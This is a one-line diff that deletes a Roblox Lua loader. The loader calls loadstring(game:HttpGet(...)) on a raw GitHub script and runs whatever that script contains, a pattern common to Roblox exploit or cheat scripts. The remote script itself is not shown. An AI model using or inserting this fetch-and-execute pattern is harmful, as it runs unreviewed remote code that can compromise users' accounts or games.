@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/LonleyWolf1988/ROBLOX-/main/FFD"), true))()
